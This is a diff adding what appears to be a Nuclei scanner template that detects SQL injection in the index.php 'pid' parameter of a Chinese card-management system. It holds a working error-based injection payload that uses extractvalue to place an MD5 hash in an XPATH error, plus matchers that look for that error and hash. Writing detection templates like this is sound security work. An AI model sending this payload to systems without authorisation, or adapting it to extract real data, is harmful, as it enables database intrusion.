@@ -1,0 +1,27 @@
+id: haoka-jituan-index-php-sqli
+info:
+  name: 号卡极团管理系统 index.php SQL注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  description: |
+    This template checks for a SQL injection vulnerability in the 号卡极团管理系统 index.php endpoint by injecting a payload that triggers an SQL error containing a predictable MD5 hash.
+
+variables:
+  t1: "{{rand_int(1000, 10000)}}"
+  t2: "{{md5(t1)}}"
+
+http:
+  - method: GET
+    path:
+      - "/order/index.php?pid=1%27%20AND%20(extractvalue(1,concat(0x7e,(select%20md5({{t1}})),0x7e)));--%20htjf"
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "XPATH syntax error"
+          - "SQL"
+      - type: word
+        words:
+          - "{{t2}}"
+        part: body
